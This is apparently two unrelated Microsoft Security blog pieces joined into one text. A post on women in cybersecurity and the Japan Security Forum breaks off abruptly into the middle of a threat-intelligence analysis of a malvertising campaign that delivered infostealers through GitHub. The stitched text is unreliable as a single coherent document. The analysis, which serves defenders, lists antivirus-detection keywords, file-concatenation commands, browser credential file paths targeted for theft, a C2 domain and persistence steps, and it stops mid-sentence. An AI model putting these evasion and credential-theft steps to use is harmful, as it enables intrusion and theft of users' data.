&lt;p&gt;Just last week I was in Tokyo for the Japan Security Forum, where Miki Tsusaka, the President of Microsoft Japan and I had a great conversation during a CyberWomen Asia fireside chat about the importance of women in cybersecurity. Following the chat was a panel discussion with Tsutaki-san, Security leader at Yamaha Motor Corporation and Debbie Furtado, one of our bright Principal group engineering managers. The event highlighted our different perspectives and talents which are invaluable to drive innovation and progress across various industries. I am proud to be a part of Microsoft Security, which is focused on building and nurturing an inclusive cybersecurity workforce and curating careers, tools, and resources that work for everyone. We recognize that this promotes business growth, strengthens global defenses, and enhances AI safety.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;According to the World Economic Forum, gender equality in entrepreneurship drives economic growth and innovation.&lt;sup&gt;1&lt;/sup&gt; McKinsey and Company has also observed that closing the gender gap in employment and entrepreneurship could increase global GDP by 20%, and that organizations with 30% or more women on executive teams are 27% more likely to achieve higher profitability.&lt;sup&gt;2&lt;/sup&gt;&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;For a better future we need everyone in the journey and this is particularly of significance in cybersecurity where we face a critical shortage of talent and where cyberthreat actors are from diverse backgrounds.  &lt;/p&gt;

&lt;h2 class="wp-block-heading" id="addressing-the-skills-gap-in-cybersecurity-and-ai"&gt;Addressing the skills gap in cybersecurity and AI&lt;/h2&gt;



&lt;p&gt;There is a significant talent gap in cybersecurity. The 2024 ISC2 Cybersecurity Workforce Study reports a global shortage of 4.7 million skilled workers.&lt;sup&gt;3&lt;/sup&gt; This worker shortage has been a significant challenge the past 12 months and is expected to continue for the next two years. To address this growing concern, we must embrace a wide range of perspectives and backgrounds to foster innovation and find more effective solutions to these challenges.&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;By incorporating individuals with varied perspectives, experiences, and approaches within the cybersecurity workforce, we can enhance problem-solving capabilities and enhance strategic defenses.&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Cybercriminals come from various cultures and backgrounds, bringing different perspectives. Security professionals with varied backgrounds and perspectives can provide creative approaches and unique insights to counter these cyberthreats.&amp;nbsp; Likewise, for AI, having different backgrounds and perspectives help with AI safety and biases.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="continue-to-deepen-expertise-and-invite-different-perspectives"&gt;Continue to deepen expertise and invite different perspectives&lt;/h2&gt;



&lt;p&gt;While progress has been made in creating opportunities for women in cybersecurity, significant work remains to remove entry barriers. It is essential to continue our efforts to improve representation in cybersecurity by creating new pathways and gaining support from more allies. I wholeheartedly encourage you to actively contribute to this objective through the many organizations and programs available and by doing the following:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Share the accomplishments of meaningful role models with a wide range of experiences and perspectives.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Adjust job requirements to remove potential biases.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Offer inclusive training that encourages professionals, particularly those in their early careers, and encourage them to advance their skills in cybersecurity.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Volunteer for educational programs that include cybersecurity and AI training.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Reach out to community groups that advocate for mentorship opportunities.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Act as an ally and create opportunities for those interested in cybersecurity careers, such as by encouraging them to participate and speak up and introducing them to peers.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Security should be for all and we are all in this together. Together, we can enhance the global security workforce and contribute to a promising future.&amp;nbsp;&amp;nbsp;&lt;/p&gt;

The attack originated from illegal streaming websites embedded with malvertising redirectors, leading to an intermediary website where the user was then redirected to GitHub and two other platforms. The campaign impacted a wide range of organizations and industries, including both consumer and enterprise devices, highlighting the indiscriminate nature of the attack.&lt;/p&gt;

		&lt;/a&gt;
	&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;GitHub was the primary platform used in the delivery of the initial access payloads and is referenced throughout this blog post; however, Microsoft Threat Intelligence also observed one payload hosted on Discord and another hosted on Dropbox.&lt;/p&gt;



&lt;p&gt;The GitHub repositories, which were taken down, stored malware used to deploy additional malicious files and scripts. Once the initial malware from GitHub gained a foothold on the device, the additional files deployed had a modular and multi-stage approach to payload delivery, execution, and persistence. The files were used to collect system information and to set up further malware and scripts to exfiltrate documents and data from the compromised host. This activity is tracked under the umbrella name Storm-0408 that we use to track numerous threat actors associated with remote access or information-stealing malware and who use phishing, search engine optimization (SEO), or malvertising campaigns to distribute malicious payloads.&lt;/p&gt;



&lt;p&gt;In this blog, we provide our analysis of this large-scale malvertising campaign, detailing our findings regarding the redirection chain and various payloads used across the multi-stage attack chain. We further provide recommendations for mitigating the impact of this threat, detection details, indicators of compromise (IOCs), and hunting guidance to locate related activity. By sharing this research, we aim to raise awareness about the tactics, techniques, and procedures (TTPs) used in this widespread activity so organizations can better prepare and implement effective mitigation strategies to protect their systems and data.&lt;/p&gt;



&lt;p&gt;We would like to thank the GitHub security team for their prompt response and collaboration in taking down the malicious repositories.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="github-activity-and-redirection-chain"&gt;GitHub activity and redirection chain&lt;/h2&gt;



&lt;p&gt;Since at least early December 2024, multiple hosts downloaded first-stage payloads from malicious GitHub repositories. The users were redirected to GitHub through a series of other redirections. Analysis of the redirector chain determined the attack likely originated from illegal streaming websites where users can watch pirated videos. The streaming websites embedded malvertising redirectors within movie frames to generate pay-per-view or pay-per-click revenue from malvertising platforms. These redirectors subsequently routed traffic through one or two additional malicious redirectors, ultimately leading to another website, such as a malware or tech support scam website, which then redirected to GitHub.&lt;/p&gt;



&lt;p&gt;Multiple stages of malware were deployed in this campaign, as listed below, and the several different stages of activity that occurred depended on the payload dropped during the second stage.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The first-stage payload that was hosted on GitHub served as the dropper for the next stage of payloads.&lt;/li&gt;



&lt;li&gt;The second-stage files were used to conduct system discovery and to exfiltrate system information that was Base64-encoded into the URL and sent over HTTP to an IP address. The information collected included data on memory size, graphic details, screen resolution, operating system (OS), and user paths.&lt;/li&gt;



&lt;li&gt;Various third-stage payloads were deployed depending on the second-stage payload. In general, the third-stage payload conducted additional malicious activities such as command and control (C2) to download additional files and to exfiltrate data, as well as defense evasion techniques.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The full redirect chain was composed of four to five layers. Microsoft researchers determined malvertising redirectors were contained within an &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe"&gt;iframe&lt;/a&gt; on illegal streaming websites.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A screenshot of code from a streaming video website and iframe showing the malvertising redirector URL" class="wp-image-137799 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image-2.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1. Code from website of streaming video and iframe showing malvertising redirector URL&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;There were several redirections that occurred before arriving at the malicious content stored on GitHub.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A diagram of the redirection chain first depicting the illegal streaming website with iframe followed by the malicious redirector and counter, which redirects to the malvertising distributor, which finally lands on the malicious content hosted on GitHub." class="wp-image-137795" height="211" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image.jpg" width="935" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2. Redirection chain from pirate streaming website to malware files on GitHub&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="attack-chain"&gt;Attack chain&lt;/h2&gt;



&lt;p&gt;Once the redirection to GitHub occurred, the malware hosted on GitHub established the initial foothold on the user’s device and functioned as a dropper for additional payload stages and running malicious code. The additional payloads included information stealers to collect system and browser information on the compromised device, of which most were either Lumma stealer or an updated version of &lt;a href="https://github.com/antivirusevasion69/doenerium"&gt;Doenerium&lt;/a&gt;. Depending on the initial payload, the deployment of NetSupport, a remote monitoring and management (RMM) software, was also often deployed alongside the infostealer. Besides the information stealers, PowerShell, JavaScript, VBScript, and AutoIT scripts were run on the host. The threat actors incorporated use of living-off-the-land binaries and scripts (LOLBAS) like &lt;em&gt;PowerShell.exe&lt;/em&gt;, &lt;a href="https://learn.microsoft.com/visualstudio/msbuild/msbuild-reference"&gt;&lt;em&gt;MSBuild.exe&lt;/em&gt;&lt;/a&gt;&lt;em&gt;,&lt;/em&gt; and &lt;em&gt;RegAsm.exe&lt;/em&gt; for C2 and data exfiltration of user data and browser credentials.&lt;/p&gt;



&lt;p&gt;After the initial foothold was gained, the activity led to a modular and multi-stage approach to payload delivery, execution, and persistence. Each stage dropped another payload with a different function, as outlined below. Actions conducted across these stages include system discovery (memory, GPU, OS, signed-in users, and others), opening browser credential files, Data Protection API (DPAPI) crypt data calls, and other functions such as obfuscated script execution and named pipe creations to conduct data exfiltration. Persistence was achieved through modification of the registry run keys and the addition of a shortcut file to the Windows &lt;em&gt;Startup&lt;/em&gt; folder.&lt;/p&gt;



&lt;p&gt;Several stages of malicious activity to conduct deployment of additional malware, collections, and exfiltration of data to a C2 were observed. While not every single initial payload followed these exact steps, this is an overall view of what occurred across most incidents analyzed:&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="A diagram generally displaying the four stages. The first stage involves the malvertising website redirecting users to GitHub pages, leading to a payload downloading from the repo. In the second stage, the payload performs system discovery and exfiltrates collected system information and stage-two payloads drop additional payloads. In the third stage, if the payload is a PowerShell script, it downloads NetSupport RAT from C2, sets persistence, and it may deliver a Lumma Stealer payload using MSBuild.exe for exfiltration. If the third stage payload is an .exe, it creates and runs a .cmd file and drops renamed AutoIT interpreter with a .com file extension, leading to the fourth stage. In the final stage, AutoIT launches binary and may drop an AutoIT interpreter with .scr file extensions, where a JavaScript file is dropped for running and persistence of those files. Finally, the AutoIT payload uses RegAsm.exe or PowerShell.exe to open files, enable browser remote debugging, and exfiltrate data. PowerShell may be deployed to set exclusion paths for Defender and/or drop NetSupport." class="wp-image-137800 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/General-depiction-of-the-four-stages-diagram.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 3. General depiction of the four stages&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="first-stage-payload-establishing-a-foothold-on-the-host"&gt;First-stage payload: Establishing a foothold on the host&lt;/h3&gt;



&lt;p&gt;During the first stage, a payload is dropped onto the user’s device from the binary hosted on GitHub, establishing a foothold on that device. As of mid-January 2025, the first-stage payloads discovered were digitally signed with a newly created certificate. A total of twelve different certificates were identified, all of which have been revoked.&lt;/p&gt;



&lt;p&gt;Most of these initial payloads dropped the following legitimate files to leverage their functionality. These files were either leveraged by the first-stage payload or by later-stage payloads, depending on the actions being conducted.&lt;/p&gt;



&lt;figure class="wp-block-table table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;File name&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Function&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;app-64.7z&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This is a compressed archive that stores the second-stage payload and additional dropped files.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;app.asar&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This is an archive file specific to Electron applications, which are directly installed programs.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;d3dcompiler_47.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is often included in DirectX redistributables, which are commonly bundled with Microsoft installers for games and graphics applications.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;elevate.exe&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is used by various installers and scripts to run processes with elevated privileges, not specific to Microsoft.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;ffmpeg.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is associated with FFmpeg, a popular multimedia framework used to handle video, audio, and other multimedia files and streams.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;libEGL.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is part of the ANGLE project, which is often found in applications that use OpenGL Embedded Systems (ES), including some web browsers and games.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;libEGLESv2.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is part of the ANGLE project, which is often found in applications that use OpenGL ES, including some web browsers and games.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;LICENSES.chromium.html&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file could contain information about the system or browser.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;nsis7z.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is associated with the plugins for the Nullsoft Scriptable Install System (NSIS), which is used to create installers for various software.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;StdUtils.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is associated with the plugins for the NSIS.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;System.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is part of the .NET Framework assembly, typically included in Microsoft installers for applications that rely on the .NET Framework.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;vk_swiftshader.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is associated with SwiftShader, which is used in applications that need a CPU-based implementation of the Vulkan API.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;vulkan-1.dll&lt;/em&gt;&lt;/td&gt;&lt;td&gt;This file is associated with applications that use the Vulkan Graphics API, such as games and graphics software.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;Depending on the first-stage payload that was initially established on the compromised device, Microsoft observed different second-stage payloads and several different methods for delivering these payloads to the device.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="second-stage-payload-system-discovery-collection-and-exfiltration"&gt;Second-stage payload: System discovery, collection, and exfiltration&lt;/h3&gt;



&lt;p&gt;The main purpose of the second-stage payload is to conduct system discovery and collect that data for exfiltration to the C2. The system information collected includes data such as memory size, graphic card details, screen resolution, operating system, user paths, and a reference to the second-stage payload’s file name.&lt;/p&gt;



&lt;p&gt;This was accomplished by querying the registry key &lt;em&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName&lt;/em&gt; for the Windows OS version and running commands, such as the &lt;a href="https://learn.microsoft.com/windows-server/administration/windows-commands/echo"&gt;&lt;em&gt;echo&lt;/em&gt;&lt;/a&gt; command, to gather the device’s name (&lt;em&gt;%COMPUTERNAME%)&lt;/em&gt; and domain name (&lt;em&gt;%USERDOMAIN%).&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;System data collected by the second-stage payload is Base64-encoded and exfiltrated as a query parameter to an IP address.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of code depicting the typical format of the URL observed when exfiltrating information collected from the compromised device. " class="wp-image-137794 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/03/image.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 4. Typical format of the URL observed when exfiltrating information collected from the compromised device&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="third-stage-payload-powershell-and-exe-binary"&gt;Third-stage payload: PowerShell and &lt;em&gt;.exe&lt;/em&gt; binary&lt;/h3&gt;



&lt;p&gt;Depending on the second-stage payload, either one or multiple executables are dropped onto the compromised device, and sometimes an accompanying encoded PowerShell script. These files initiate a chain of events that conduct command execution, payload delivery, defensive evasion, persistence, C2 communications, and data exfiltration. The analysis of the dropped executables is first discussed below, followed by review of the PowerShell scripts observed.&lt;/p&gt;



&lt;h4 class="wp-block-heading" id="third-stage-exe-analysis"&gt;Third-stage .exe analysis&lt;/h4&gt;



&lt;p&gt;The second-stage payloads run the dropped third-stage executables using the command prompt (for example, &lt;em&gt;cmd.exe&amp;nbsp; /d /s /c “”C:\Users\&amp;lt;user&amp;gt;\AppData\Local\Temp\ApproachAllan.exe””&lt;/em&gt;). The&lt;em&gt; /c &lt;/em&gt;flag ensures that the command runs and exits quickly. When the third-stage &lt;em&gt;.exe&lt;/em&gt; runs, it drops a command file (.&lt;em&gt;cmd&lt;/em&gt;) and launches it using the command prompt (for example, “&lt;em&gt;cmd.exe” /c copy Beauty Beauty.cmd &amp;amp;&amp;amp; Beauty.cmd&lt;/em&gt;). The &lt;em&gt;.cmd&lt;/em&gt; file performs several actions, such as running &lt;em&gt;tasklist&lt;/em&gt;, to initiate the discovery of running programs. This is followed by the &lt;em&gt;findstr&lt;/em&gt; to search for keywords associated with security software:&lt;/p&gt;



&lt;figure class="wp-block-table table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;&lt;em&gt;findstr&lt;/em&gt; keyword&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Associated software&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;wrsa&lt;/td&gt;&lt;td&gt;Webroot SecureAnywhere&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;opssvc&lt;/td&gt;&lt;td&gt;Quick Heal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;AvastUI&lt;/td&gt;&lt;td&gt;Avast Antivirus&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;AVGUI&lt;/td&gt;&lt;td&gt;AVG Antivirus&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;bdservicehost&lt;/td&gt;&lt;td&gt;Bitdefender Antivirus&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;nsWscSvc&lt;/td&gt;&lt;td&gt;Norton Security&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;ekrn&lt;/td&gt;&lt;td&gt;ESET&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;SophosHealth&lt;/td&gt;&lt;td&gt;Sophos&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;The &lt;em&gt;.cmd&lt;/em&gt; file also concatenates multiple files into one with a single character file name: &lt;em&gt;“cmd /c copy /b ..\Verzeichnis + ..\Controlling + ..\Constitute + ..\Enjoyed + ..\Confusion + ..\Min +..\Statutory J”&lt;/em&gt;. This single character filename is used next.&lt;/p&gt;



&lt;p&gt;Following this, the third-stage &lt;em&gt;.exe&lt;/em&gt; produces an AutoIT v3 interpreter file that is renamed from the typical file name of &lt;em&gt;AutoIt3.exe&lt;/em&gt; and uses a &lt;em&gt;.com&lt;/em&gt; file extension. The &lt;em&gt;.cmd&lt;/em&gt; file initiates the execution of the&lt;em&gt; .com&lt;/em&gt; file against the single character binary (such as &lt;em&gt;Briefly.com J&lt;/em&gt;). Note, most of the second-stage payloads follow this progression chain, and as mentioned a second-stage payload can also drop multiple executables, all following the same process. For example:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;First stage&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;X-essentiApp.exe&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Second stage&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;Ionixnignx.exe&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Third stage&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;EverybodyViewing.exe&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;ReliefOrganizational.exe&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;InflationWinston.exe&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Third-stage command files&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;Beauty.cmd&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Possess.cmd&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Villa.cmd&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Fourth-stage AutoIT &lt;em&gt;.com&lt;/em&gt; files&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;Alexandria.com&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Kills.com&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;Briefly.com&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;We observed multiple &lt;em&gt;.com&lt;/em&gt; files originating from different dropped executables, each performing distinct functions while occasionally overlapping in behavior. These files facilitate persistence, process injection, remote debugging, and data exfiltration through various mechanisms. One &lt;em&gt;.com&lt;/em&gt; file, such as &lt;em&gt;Alexandria.com&lt;/em&gt;, drops a &lt;em&gt;.scr&lt;/em&gt; file (another renamed AutoIT interpreter), and a&lt;em&gt; .js&lt;/em&gt; (JavaScript) file with the same name as the &lt;em&gt;.scr &lt;/em&gt;file. The purpose of the JavaScript file is to ensure persistence by creating a &lt;em&gt;.url &lt;/em&gt;internet shortcut that points to the JavaScript file and is placed in the &lt;em&gt;Startup&lt;/em&gt; folder, ensuring that the &lt;em&gt;.scr &lt;/em&gt;file executes when the &lt;em&gt;.js&lt;/em&gt; file executes (through &lt;em&gt;Wscript.exe&lt;/em&gt;) upon user sign-in. Alternatively, persistence can be achieved using scheduled task creation. The &lt;em&gt;.scr &lt;/em&gt;file can initiate C2 connections, enable remote debugging on Chrome or Edge within a hidden desktop session, or create TCP listening sockets on ports 9220-9229. This functionality allows threat actors to monitor browsing activity and interact with an active browser instance. These files can also open sensitive data files, indicating their role in facilitating post-exploitation activities.&lt;/p&gt;



&lt;p&gt;Another &lt;em&gt;.&lt;/em&gt;&lt;em&gt;com&lt;/em&gt; file, such as &lt;em&gt;affiliated.com&lt;/em&gt;, also focuses on remote debugging and browser monitoring. In addition to remote monitoring, &lt;em&gt;affiliated.com&lt;/em&gt; initiates network connections to Telegram, Let’s Encrypt, and threat actor domains, potentially for C2 or exfiltration. It also accesses DPAPI to decrypt sensitive stored credentials and retrieve browser data.&lt;/p&gt;



&lt;p&gt;The final observed &lt;em&gt;.&lt;/em&gt;&lt;em&gt;com&lt;/em&gt; file, such as &lt;em&gt;Briefly.com&lt;/em&gt;, exhibits behavior similar to &lt;em&gt;affiliated.com&lt;/em&gt; but extends its capabilities to include screenshot capture, data exfiltration, and PowerShell-based execution. This file accesses browser and user data for collection, establishes connections to Pastebin and additional C2 domains, and drops the fourth-stage PowerShell script.&lt;/p&gt;



&lt;p&gt;The order in which these &lt;em&gt;.&lt;/em&gt;&lt;em&gt;com&lt;/em&gt; files run is not strictly defined, as one or multiple files can perform overlapping functions depending on the third-stage payload. In many cases, the &lt;em&gt;.&lt;/em&gt;&lt;em&gt;com&lt;/em&gt; files also leverage LOLBAS like &lt;em&gt;RegAsm.exe&lt;/em&gt; by dropping a legitimate file into the &lt;em&gt;%TEMP%&lt;/em&gt; directory or injecting malicious code into it using &lt;em&gt;NtAllocateVirtualMemory&lt;/em&gt; and &lt;em&gt;SetThreadContext &lt;/em&gt;API function calls. &lt;em&gt;RegAsm.exe&lt;/em&gt; is used to establish C2 connections over TCP ports 15647 or 9000, exfiltrating data, accessing DPAPI for decryption, monitoring keystrokes using the &lt;em&gt;WH_KEYBOARD_LL &lt;/em&gt;hook, and more. This flexibility in execution allows threat actors to tailor their approach based on environmental factors, such as security configurations and user activity.&lt;/p&gt;



&lt;p&gt;Browser data files seen accessed:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\&amp;lt;user profile uid&amp;gt;.default-release\cookies.sqlite&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\&amp;lt;user profile uid&amp;gt;.default-release\formhistory.sqlite&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\&amp;lt;user profile uid&amp;gt;.default-release\key4.db&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\&amp;lt;user profile uid&amp;gt;.default-release\logins.json&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;\AppData\Local\Google\Chrome\User Data\Default\Web Data&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;\AppData\Local\Google\Chrome\User Data\Default\Login Data&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;\AppData\Local\Microsoft\Edge\User Data\Default\Login Data&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;User data file paths seen accessed:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;C:\\Users\&amp;lt;user&amp;gt;\\OneDrive&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;C:\\Users\&amp;lt;user&amp;gt;\\Documents&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;&lt;em&gt;C:\\Users\&amp;lt;user&amp;gt;\\Downloads&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;h4 class="wp-block-heading" id="third-stage-powershell-analysis"&gt;Third-stage PowerShell analysis&lt;/h4&gt;



&lt;p&gt;If a PowerShell script is also dropped by the second-stage payload, it includes Base64-obfuscated commands to conduct actions, such as use &lt;a href="https://techcommunity.microsoft.com/blog/containers/tar-and-curl-come-to-windows/382409"&gt;&lt;em&gt;curl&lt;/em&gt;&lt;/a&gt; to download additional files like NetSupport from the C2, create persistence for the NetSupport RAT, and exfiltrate system information to C2 servers. To ensure no errors or the progress meter is displayed on the compromised device, the &lt;em&gt;curl&lt;/em&gt; command is often used with the &lt;a href="https://curl.se/docs/manpage.html#-s"&gt;&lt;em&gt;&amp;#8211;silent&lt;/em&gt;&lt;/a&gt; option when downloading files from the C2. PowerShell is often configured to run without restrictions with the &lt;a href="https://learn.microsoft.com/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-5.1#-executionpolicy"&gt;&lt;em&gt;-ExecutionPolicy Bypass&lt;/em&gt;&lt;/a&gt; parameter.&lt;/p&gt;



&lt;p&gt;As an example, in some of the incidents, when the second-stage payload runs, a PowerShell script is dropped and executed. The script sends the compromised device’s name to the C2 and downloads NetSupport RAT from the same C2.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Second-stage payload: &lt;em&gt;Squarel.exe&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;PowerShell script: SHA-256: d70ccae7914fc8c36c9e11b2a7f10bebd7f5696e78d8836554f4990b0f688dbb&lt;/li&gt;



&lt;li&gt;C2 domain: &lt;em&gt;keikochio[.]com&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;NetSupport RAT: SHA-256: 32a828e2060e92b799829a12e3e87730e9a88ecfa65a4fc4700bdcc57a52d995&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In another case, a second-stage payload drops a PowerShell script, which connects to &lt;em&gt;hxxps://ipinfo[.]io&lt;/em&gt; to gather the compromised device’s external-facing IP address. This information is sent to a Telegram chat, then drops &lt;em&gt;presentationhost.exe &lt;/em&gt;(a renamed NetSupport binary) and &lt;em&gt;remcmdstub.exe &lt;/em&gt;(NetSupport Command Manager) into the &lt;em&gt;%TEMP%&lt;/em&gt; directory. Finally, the PowerShell script establishes persistence for &lt;em&gt;presentationhost.exe&lt;/em&gt; by adding it to the auto-start extensibility points (ASEP) registry keys. When it runs, the NetSupport RAT connects to the C2 and captures a screenshot of the compromised device’s desktop. It also delivers a Lumma executable that drops a VBScript file with the same name. The VBScript file runs encoded PowerShell to initiate C2 connections and launches &lt;em&gt;MSBuild.exe&lt;/em&gt; to enable Chrome remote debugging on a hidden desktop. Additionally, &lt;em&gt;presentationhost.exe&lt;/em&gt; initiates &lt;em&gt;remcmdstub.exe&lt;/em&gt;, which leverages&lt;em&gt; iScrPaint.exe&lt;/em&gt; (iTop Screen Recorder) to run &lt;em&gt;MSBuild.exe&lt;/em&gt; and access browser credential files for exfiltration. The &lt;em&gt;iScrPaint.exe&lt;/em&gt; file also establishes persistence by placing a 